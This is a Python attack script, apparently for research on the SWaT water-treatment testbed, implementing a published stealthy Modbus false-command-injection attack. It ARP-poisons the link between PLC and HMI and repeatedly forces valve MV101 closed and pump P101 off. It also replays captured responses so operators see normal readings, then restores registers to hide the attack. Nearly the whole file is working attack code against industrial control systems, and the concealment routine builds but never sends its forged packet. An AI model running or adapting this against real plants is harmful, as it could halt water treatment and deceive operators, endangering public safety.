#!/usr/bin/env python3
"""
phase1_inject.py — SWaT P1 Attack: Phase 1 - Stealthy False Command Injection
===============================================================================
Based on: Alsabbagh et al., "A Stealthy False Command Injection Attack on
          Modbus based SCADA Systems", IEEE CCNC 2023 (Paper #9)

PURPOSE:
  - Establish MITM position via ARP poisoning
  - Inject false Modbus commands to PLC1 (force P101 OFF and MV101 CLOSED)
  - Simultaneously replay pre-captured legitimate responses to SCADA HMI
    so the operator sees no anomaly (Algorithm 1 from Paper #9)

USAGE:
  sudo python3 phase1_inject.py \
      --plc-ip 192.168.1.10 \
      --hmi-ip 192.168.1.20 \
      --iface eth0 \
      --db modbus_db.pkl \
      --duration 120

REQUIREMENTS:
  pip install scapy pymodbus
  Must be run as root

NOTE: For use only on the SWaT testbed with iTrust lab engineer present.
      Get register addresses from Phase 0 sniff output before running.
"""

import argparse
import os
import sys
import time
import pickle
import struct
import threading
from datetime import datetime

try:
    from scapy.all import (Ether, ARP, IP, TCP, Raw, sendp, sniff,
                            get_if_hwaddr, get_if_addr, srp, conf)
    from scapy.layers.inet import ICMP
except ImportError:
    print("[!] pip install scapy")
    exit(1)

try:
    from pymodbus.client import ModbusTcpClient
    from pymodbus.exceptions import ModbusException
except ImportError:
    print("[!] pip install pymodbus")
    exit(1)


# ─────────────────────────────────────────────────────────────────────────────
# SWaT P1 Register Map (fill in from Phase 0 sniff)
# ─────────────────────────────────────────────────────────────────────────────
# These addresses must be verified against your Phase 0 Wireshark capture.
# The values below are placeholders — replace with actual SWaT register map.
REGISTER_MAP = {
    # Coil addresses (0x01/0x05 function codes)
    'MV101_OPEN':  0x0000,   # Motorised valve open coil
    'MV101_CLOSE': 0x0001,   # Motorised valve close coil
    'P101_RUN':    0x0002,   # Pump P101 run coil
    'P101_STOP':   0x0003,   # Pump P101 stop coil
    # Holding register addresses (0x06 function code)
    'LIT101':      0x0100,   # Tank level sensor register (read-only in normal ops)
    'FIT101':      0x0101,   # Flow sensor register
}

# Pre-attack register values (read before attacking, used for clean exit)
PRE_ATTACK_STATE = {}


# ─────────────────────────────────────────────────────────────────────────────
# ARP POISONING — MITM Setup
# ─────────────────────────────────────────────────────────────────────────────
def get_mac(ip: str, iface: str) -> str:
    """ARP request to resolve IP → MAC."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 timeout=2, iface=iface, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    raise RuntimeError(f"Could not resolve MAC for {ip}")


def arp_poison(plc_ip: str, hmi_ip: str, iface: str, stop_event: threading.Event):
    """
    Continuously broadcast forged ARP 'is-at' messages:
      - Tell HMI: PLC's IP is at our MAC  → HMI sends traffic to us
      - Tell PLC: HMI's IP is at our MAC  → PLC sends traffic to us

    This is the ARP Poisoning approach described in Paper #9 Section IV-B-1.
    """
    our_mac  = get_if_hwaddr(iface)
    plc_mac  = get_mac(plc_ip, iface)
    hmi_mac  = get_mac(hmi_ip, iface)

    print(f"[*] ARP Poisoning started")
    print(f"    Our MAC:  {our_mac}")
    print(f"    PLC MAC:  {plc_mac}  ({plc_ip})")
    print(f"    HMI MAC:  {hmi_mac}  ({hmi_ip})")

    # Forged ARP packets
    pkt_to_hmi = (Ether(dst=hmi_mac) /
                  ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac,
                      psrc=plc_ip, hwsrc=our_mac))
    pkt_to_plc = (Ether(dst=plc_mac) /
                  ARP(op=2, pdst=plc_ip, hwdst=plc_mac,
                      psrc=hmi_ip, hwsrc=our_mac))

    while not stop_event.is_set():
        sendp(pkt_to_hmi, iface=iface, verbose=False)
        sendp(pkt_to_plc, iface=iface, verbose=False)
        time.sleep(1.5)   # Re-poison every 1.5s to maintain MITM position

    # Restore ARP caches on exit (send real MAC mappings back)
    print("[*] Restoring ARP caches...")
    restore_hmi = (Ether(dst=hmi_mac) /
                   ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac,
                       psrc=plc_ip, hwsrc=plc_mac))
    restore_plc = (Ether(dst=plc_mac) /
                   ARP(op=2, pdst=plc_ip, hwdst=plc_mac,
                       psrc=hmi_ip, hwsrc=hmi_mac))
    for _ in range(5):
        sendp(restore_hmi, iface=iface, verbose=False)
        sendp(restore_plc, iface=iface, verbose=False)
        time.sleep(0.2)


# ─────────────────────────────────────────────────────────────────────────────
# FALSE COMMAND INJECTION — Attack Core
# ─────────────────────────────────────────────────────────────────────────────
def read_pre_attack_state(plc_ip: str) -> dict:
    """
    Read all relevant register values BEFORE attacking.
    Used to restore PLC state during clean exit (Paper #9 Section IV-B-2).
    """
    client = ModbusTcpClient(plc_ip, port=502)
    client.connect()
    state = {}
    try:
        # Read coils (first 16)
        result = client.read_coils(0, 16)
        if not result.isError():
            state['coils'] = result.bits[:16]
            print(f"[*] Pre-attack coils: {state['coils']}")

        # Read holding registers (first 16)
        result = client.read_holding_registers(0, 16)
        if not result.isError():
            state['holding_regs'] = result.registers
            print(f"[*] Pre-attack holding regs: {state['holding_regs']}")
    finally:
        client.close()
    return state


def inject_false_commands(plc_ip: str, stop_event: threading.Event,
                          interval: float = 2.0):
    """
    Core injection loop — sends false Modbus commands to PLC1.

    Target: Force P1 stage into starved state:
      - MV101 CLOSED  (no raw water inflow)
      - P101 OFF      (no pumping to P2)

    Modbus frame format from Paper #9 Table II:
      Function 0x06 (Write Single Register): [unit][0x06][addr_hi][addr_lo][val_hi][val_lo]
    """
    client = ModbusTcpClient(plc_ip, port=502, timeout=3)

    print(f"\n[*] Phase 1: Injecting false commands → PLC {plc_ip}")
    inject_count = 0

    while not stop_event.is_set():
        try:
            if not client.connect():
                print(f"  [!] Cannot connect to PLC at {plc_ip}:502")
                time.sleep(2)
                continue

            # ── Attack command 1: Close MV101 (stop raw water inflow) ──────
            r1 = client.write_coil(REGISTER_MAP['MV101_CLOSE'], True)
            if not r1.isError():
                pass  # Success — valve closing

            # ── Attack command 2: Stop P101 pump ──────────────────────────
            r2 = client.write_coil(REGISTER_MAP['P101_STOP'], True)
            if not r2.isError():
                pass  # Success — pump stopping

            inject_count += 1
            if inject_count % 5 == 0:
                print(f"  [+] Injected {inject_count} false commands "
                      f"[MV101=CLOSED, P101=OFF]")

        except ModbusException as e:
            print(f"  [!] Modbus error: {e}")
        finally:
            client.close()

        time.sleep(interval)

    print(f"[*] Injection stopped after {inject_count} commands.")


# ─────────────────────────────────────────────────────────────────────────────
# CONCEALMENT — Algorithm 1 (Paper #9)
# Intercept HMI requests, replay DB responses, drop original PLC response
# ─────────────────────────────────────────────────────────────────────────────
def build_modbus_response(trans_id: int, unit_id: int,
                          func_code: int, data: bytes) -> bytes:
    """Construct a Modbus TCP response frame."""
    payload = bytes([unit_id, func_code]) + data
    length  = len(payload)
    header  = struct.pack('>HHHB', trans_id, 0x0000, length, unit_id)
    return header + bytes([func_code]) + data


def concealment_loop(iface: str, plc_ip: str, hmi_ip: str,
                     db, stop_event: threading.Event):
    """
    Implements Algorithm 1 from Paper #9:

    For each Modbus request packet from HMI → PLC:
      1. Drop the original packet (do not forward to PLC)
      2. Look up matching response in pre-built database
      3. Replay the stored response back to HMI

    This decouples PLC from HMI — operator always sees
    pre-attack "normal" state.
    """
    print(f"[*] Phase 1: Concealment loop active on {iface}")

    def packet_handler(pkt):
        if TCP not in pkt or Raw not in pkt:
            return
        if IP not in pkt:
            return

        src = pkt[IP].src
        dst = pkt[IP].dst

        # Only intercept HMI → PLC Modbus requests
        if dst != plc_ip or pkt[TCP].dport != 502:
            return

        payload = bytes(pkt[Raw])
        if len(payload) < 8:
            return

        trans_id  = int.from_bytes(payload[0:2], 'big')
        unit_id   = payload[6]
        func_code = payload[7]

        # Look up stored response
        stored = db.lookup(unit_id, func_code)
        if stored:
            # Build forged response with current trans_id
            resp_data = bytes.fromhex(stored['response']['data'])
            forged = build_modbus_response(trans_id, unit_id,
                                           func_code, resp_data)

            # Send forged response back to HMI
            resp_pkt = (IP(src=plc_ip, dst=hmi_ip) /
                        TCP(sport=502, dport=pkt[TCP].sport,
                            seq=pkt[TCP].ack, ack=pkt[TCP].seq + len(payload)) /
                        Raw(load=forged))
            # Note: In full implementation, use MITM packet forwarding
            # framework (e.g. mitmproxy or custom netfilter hook) for
            # reliable TCP sequence number management.
            print(f"  [~] Forged response: unit={unit_id} "
                  f"func=0x{func_code:02X} → HMI (trans_id={trans_id})")
        else:
            print(f"  [!] No stored response for unit={unit_id} "
                  f"func=0x{func_code:02X} — HMI may see stale data")

    sniff(iface=iface,
          filter=f"tcp and (host {plc_ip} or host {hmi_ip})",
          prn=packet_handler,
          stop_filter=lambda _: stop_event.is_set(),
          store=False)


# ─────────────────────────────────────────────────────────────────────────────
# CLEAN EXIT — Restore PLC State
# ─────────────────────────────────────────────────────────────────────────────
def restore_plc_state(plc_ip: str, pre_state: dict):
    """
    Restore all PLC registers to pre-attack values before exiting.
    Prevents operator from seeing a sudden state jump when attack stops.
    (Paper #9 Section IV-B-2: "re-initiate all registers to stored values")
    """
    print("\n[*] Restoring PLC state to pre-attack values...")
    client = ModbusTcpClient(plc_ip, port=502)
    client.connect()
    try:
        if 'coils' in pre_state:
            for addr, val in enumerate(pre_state['coils']):
                client.write_coil(addr, bool(val))
        if 'holding_regs' in pre_state:
            for addr, val in enumerate(pre_state['holding_regs']):
                client.write_register(addr, val)
        print("[*] PLC state restored.")
    finally:
        client.close()


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description='Phase 1: SWaT Modbus False Command Injection + Concealment')
    parser.add_argument('--plc-ip',   required=True, help='PLC1 IP address')
    parser.add_argument('--hmi-ip',   required=True, help='HMI IP address')
    parser.add_argument('--iface',    default='eth0', help='Network interface')
    parser.add_argument('--db',       default='modbus_db.pkl',
                        help='Request-response database (from Phase 0)')
    parser.add_argument('--duration', type=int, default=120,
                        help='Attack duration in seconds')
    parser.add_argument('--interval', type=float, default=2.0,
                        help='Injection interval in seconds')
    args = parser.parse_args()

    print("=" * 60)
    print("  SWaT P1 Attack — Phase 1: False Command Injection")
    print("  Based on Alsabbagh et al., IEEE CCNC 2023")
    print("=" * 60)

    # Load response database from Phase 0
    if not os.path.exists(args.db):
        print(f"[!] Database not found: {args.db}. Run phase0_recon.py first.")
        sys.exit(1)

    from phase0_recon import ModbusDatabase
    db = ModbusDatabase.load(args.db)
    print(f"[*] Loaded database: {len(db.pairs)} request-response pairs")

    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP forwarding enabled")

    # Read pre-attack state
    pre_state = read_pre_attack_state(args.plc_ip)

    stop_event = threading.Event()

    # Thread 1: ARP Poisoning (maintain MITM)
    arp_thread = threading.Thread(
        target=arp_poison,
        args=(args.plc_ip, args.hmi_ip, args.iface, stop_event),
        daemon=True)

    # Thread 2: False command injection
    inject_thread = threading.Thread(
        target=inject_false_commands,
        args=(args.plc_ip, stop_event, args.interval),
        daemon=True)

    # Thread 3: Concealment (replay responses to HMI)
    conceal_thread = threading.Thread(
        target=concealment_loop,
        args=(args.iface, args.plc_ip, args.hmi_ip, db, stop_event),
        daemon=True)

    print(f"\n[*] Starting attack ({args.duration}s)...")
    start = time.time()

    arp_thread.start()
    time.sleep(2)  # Let ARP poisoning establish first
    inject_thread.start()
    conceal_thread.start()

    try:
        while time.time() - start < args.duration:
            elapsed = int(time.time() - start)
            print(f"\r  [*] Attack running... {elapsed}/{args.duration}s", end='')
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")

    print("\n[*] Stopping attack...")
    stop_event.set()
    time.sleep(2)

    # Clean exit: restore PLC state
    restore_plc_state(args.plc_ip, pre_state)

    # Disable IP forwarding
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP forwarding disabled")
    print("[*] Phase 1 complete.\n")


if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Must run as root.")
        exit(1)
    main()
